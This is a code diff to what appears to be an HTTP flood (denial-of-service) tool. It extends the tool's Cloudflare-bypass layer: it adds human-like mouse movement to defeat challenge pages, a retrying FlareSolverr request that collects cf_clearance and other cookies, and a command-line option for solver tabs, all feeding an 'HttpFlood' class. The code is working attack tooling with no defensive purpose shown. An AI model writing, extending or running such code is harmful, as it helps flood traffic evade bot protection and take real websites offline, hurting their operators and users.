@@ -35,6 +35,7 @@ if hasattr(sys.stderr, "reconfigure"):
 from base64 import b64encode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
+from src.core.human_mouse import move as human_mouse_move
 from datetime import datetime, timedelta
 from itertools import cycle
 from json import load
@@ -830,6 +831,7 @@ class EngineState:
         self.active_threads_target = RawValue("i", 0)
         self.max_threads = 0
         self.flaresolverr_url: str | None = None
+        self.flaresolverr_tabs: int | None = None
 
 ENGINE_STATE = EngineState()
 
@@ -2059,7 +2061,7 @@ class BrowserEngine:
                         if "cf_clearance" in cookie_str:
                             break
                         
-                        page.actions.move(randint(50, 950), randint(50, 750))
+                        human_mouse_move(page, randint(50, 950), randint(50, 750))
                         try:
                             found = False
                             for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container"]:
@@ -2368,7 +2370,7 @@ class BrowserEngine:
         return cookie, ua
 
     @staticmethod
-    def _solve_cf_internal(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
+    def _solve_cf_internal(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000, tabs_till_verify: int = None):
         if not url.startswith("https://") and not url.startswith("http://"):
             url = "https://" + url
         elif url.startswith("http://"):
@@ -2379,35 +2381,52 @@ class BrowserEngine:
         # Tier 0: External FlareSolverr API
         if getattr(ENGINE_STATE, "flaresolverr_url", None):
             logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 0 (FlareSolverr API) at {ENGINE_STATE.flaresolverr_url}...{bcolors.RESET}")
-            try:
-                import urllib.request
-                import json
-                payload_data = {
-                    "cmd": "request.get",
-                    "url": url,
-                    "maxTimeout": 60000
-                }
-                if proxy:
-                    payload_data["proxy"] = {"url": f"http://{proxy}" if "://" not in proxy else proxy}
-                payload = json.dumps(payload_data).encode("utf-8")
-                req = urllib.request.Request(
-                    ENGINE_STATE.flaresolverr_url,
-                    data=payload,
-                    headers={"Content-Type": "application/json"}
-                )
-                with urllib.request.urlopen(req, timeout=65) as resp:
-                    resp_data = json.loads(resp.read().decode("utf-8"))
-                    if resp_data.get("status") == "ok" and resp_data.get("solution"):
-                        sol = resp_data["solution"]
-                        cookies = sol.get("cookies", [])
-                        ua = sol.get("userAgent", user_agent)
-                        cf_cookie = next((f"{c['name']}={c['value']}" for c in cookies if c.get("name") == "cf_clearance"), None)
-                        if cf_cookie:
-                            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
-                            HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
-                            return cf_cookie, ua
-            except Exception as e:
-                logger.debug(f"[!] Tier 0 FlareSolverr failed: {e}. Falling back to Tier 1.")
+            for attempt in range(2):
+                try:
+                    import urllib.request
+                    import json
+                    import time
+                    timeout_ms = timeout if timeout > 1000 else timeout * 1000
+                    payload_data = {
+                        "cmd": "request.get",
+                        "url": url,
+                        "maxTimeout": timeout_ms
+                    }
+                    effective_tabs = tabs_till_verify if tabs_till_verify is not None else getattr(ENGINE_STATE, "flaresolverr_tabs", None)
+                    if effective_tabs is not None:
+                        payload_data["tabs_till_verify"] = effective_tabs
+                    if proxy:
+                        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
+                        payload_data["proxy"] = {"url": proxy_url}
+                    payload = json.dumps(payload_data).encode("utf-8")
+                    req = urllib.request.Request(
+                        ENGINE_STATE.flaresolverr_url,
+                        data=payload,
+                        headers={"Content-Type": "application/json"}
+                    )
+                    with urllib.request.urlopen(req, timeout=(timeout_ms / 1000.0) + 5) as resp:
+                        resp_data = json.loads(resp.read().decode("utf-8"))
+                        if resp_data.get("status") == "ok" and resp_data.get("solution"):
+                            sol = resp_data["solution"]
+                            cookies = sol.get("cookies", [])
+                            ua = sol.get("userAgent", user_agent)
+                            if cookies:
+                                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies if "name" in c and "value" in c])
+                                cf_present = any(c.get("name") == "cf_clearance" for c in cookies)
+                                if cf_present or resp_data.get("status") == "ok":
+                                    logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
+                                    HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
+                                    return cookie_str, ua
+                    break
+                except Exception as e:
+                    is_http_500 = (hasattr(e, "code") and getattr(e, "code") == 500) or "500" in str(e)
+                    if attempt == 0 and is_http_500:
+                        logger.warning(f"{bcolors.WARNING}[!] Tier 0 FlareSolverr HTTP 500 (browser cleanup in progress), retrying in 2.5s...{bcolors.RESET}")
+                        time.sleep(2.5)
+                        continue
+                    logger.warning(f"[!] Tier 0 FlareSolverr failed: {e}. Falling back to Tier 1.")
+                    break
+
 
         # Tier 1: Lightweight HTTP
         logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 1 (Lightweight)...{bcolors.RESET}")
@@ -5152,6 +5171,10 @@ async def main_async():
                     HttpFlood._cfbuam_ua = next(args_iter, None)
                 elif arg == "--flaresolverr":
                     ENGINE_STATE.flaresolverr_url = next(args_iter, "http://localhost:8191/v1")
+                elif arg == "--flaresolverr-tabs":
+                    try:
+                        ENGINE_STATE.flaresolverr_tabs = int(next(args_iter, 0))
+                    except: pass
 
             # Auto-load from Intelligence DB if not provided
             if not HttpFlood._cfbuam_cookie:
